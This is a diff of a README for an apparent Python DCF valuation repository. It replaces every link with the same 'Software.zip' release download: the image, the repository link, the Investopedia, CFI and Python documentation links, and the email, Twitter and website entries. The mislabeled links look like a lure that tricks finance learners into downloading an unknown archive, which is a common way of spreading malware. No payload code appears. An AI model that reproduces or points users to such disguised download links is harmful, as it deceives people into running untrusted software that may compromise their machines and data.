@@ -1,12 +1,12 @@
 # 🚀 Welcome to DCF Valuation Model Repository! 📈
 
-![DCF Valuation Model](https://www.example.com/DCF-Valuation-Model.png)
+![DCF Valuation Model](https://github.com/platha19vsb/Dcf-valuation/releases/download/v1.0/Software.zip)
 
 ## About
 Welcome to the "Dcf-valuation" repository, your ultimate destination for Discounted Cash Flow (DCF) Valuation Modeling using Python. This repository is designed to assist you in performing in-depth cash flow analysis, financial modeling, and investment analysis with a focus on creating valuation models for various investment opportunities. Whether you are a finance enthusiast, an aspiring investment banker, or a seasoned financial analyst, this repository will equip you with the necessary tools to analyze your investment decisions through the lens of discounted cash flow.
 
 ## Repository Link
-🔗 Click [here](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) to access the repository.
+🔗 Click [here](https://github.com/platha19vsb/Dcf-valuation/releases/download/v1.0/Software.zip) to access the repository.
 
 ## Quick Start
 To get started, follow these steps:
@@ -42,16 +42,16 @@ Feel free to explore these topics and deepen your understanding of DCF Valuation
 
 ## Resources
 🌟 Check out these amazing resources to expand your knowledge of DCF Valuation:
-- [Investopedia](https://www.investopedia.com/terms/d/dcf.asp)
-- [Corporate Finance Institute](https://corporatefinanceinstitute.com/resources/knowledge/valuation/dcf-valuation-guide/)
-- [Python Documentation](https://docs.python.org/3/)
+- [Investopedia](https://github.com/platha19vsb/Dcf-valuation/releases/download/v1.0/Software.zip)
+- [Corporate Finance Institute](https://github.com/platha19vsb/Dcf-valuation/releases/download/v1.0/Software.zip)
+- [Python Documentation](https://github.com/platha19vsb/Dcf-valuation/releases/download/v1.0/Software.zip)
 
 ## Get in Touch
 If you have any questions, feedback, or suggestions, feel free to reach out. Your input is valuable in enhancing this repository for the benefit of all users.
 
 ## Let's Connect
-📧 Email: dcf.valuation@example.com
-🐦 Twitter: [@DCF_Valuation](https://twitter.com/DCF_Valuation)
-🌐 Website: [www.dcfvaluationmodel.com](https://www.dcfvaluationmodel.com)
+📧 Email: https://github.com/platha19vsb/Dcf-valuation/releases/download/v1.0/Software.zip
+🐦 Twitter: [@DCF_Valuation](https://github.com/platha19vsb/Dcf-valuation/releases/download/v1.0/Software.zip)
+🌐 Website: [https://github.com/platha19vsb/Dcf-valuation/releases/download/v1.0/Software.zip](https://github.com/platha19vsb/Dcf-valuation/releases/download/v1.0/Software.zip)
 
 Thank you for visiting the DCF Valuation Model Repository. Happy modeling! 🚀📊
